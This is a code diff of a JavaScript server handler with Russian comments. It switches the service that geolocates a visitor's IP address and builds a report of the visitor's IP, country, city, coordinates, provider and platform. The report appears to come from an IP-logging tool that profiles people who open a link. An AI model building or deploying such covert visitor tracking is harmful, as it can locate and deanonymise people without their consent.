@@ -11,12 +11,12 @@ export default async function handler(req, res) {
 
   let geo = {};
   try {
-    // Запрашиваем географию по IP через ipinfo.io
-    const geoRes = await fetch(`http://ipinfo.io/${realIP}/json`);
+    // Запрашиваем географию по IP через ip-geolocation.io
+    const geoRes = await fetch(`https://ip-geolocation.whoisxmlapi.com/api/v1?ipAddress=${realIP}`);
     const geoData = await geoRes.json();
 
     // Проверяем, если ответ успешный
-    if (geoData.error) {
+    if (geoData.status === "fail" || !geoData.location) {
       geo = {
         country: "Не удалось получить данные",
         city: "Не удалось получить данные",
@@ -25,7 +25,7 @@ export default async function handler(req, res) {
         org: "Не удалось получить данные"
       };
     } else {
-      geo = geoData;
+      geo = geoData.location;
     }
   } catch (_) {
     geo = {
@@ -43,7 +43,7 @@ export default async function handler(req, res) {
 🌍 IP: \`${realIP}\`
 📍 Страна: \`${geo.country || "?"}\`
 🏙️ Город: \`${geo.city || "?"}\`
-🧭 Координаты: \`${geo.loc ? geo.loc.split(',')[0] : "?"}\`, \`${geo.loc ? geo.loc.split(',')[1] : "?"}\`
+🧭 Координаты: \`${geo.lat || "?"}\`, \`${geo.lon || "?"}\`
 🌐 Провайдер: \`${geo.org || "?"}\`
 🕰️ Локальное время: \`${new Date().toLocaleString()}\`
 💻 Платформа: \`${ua.includes("Windows") ? "Windows" : ua.includes("Android") ? "Android" : "Другая"}\`
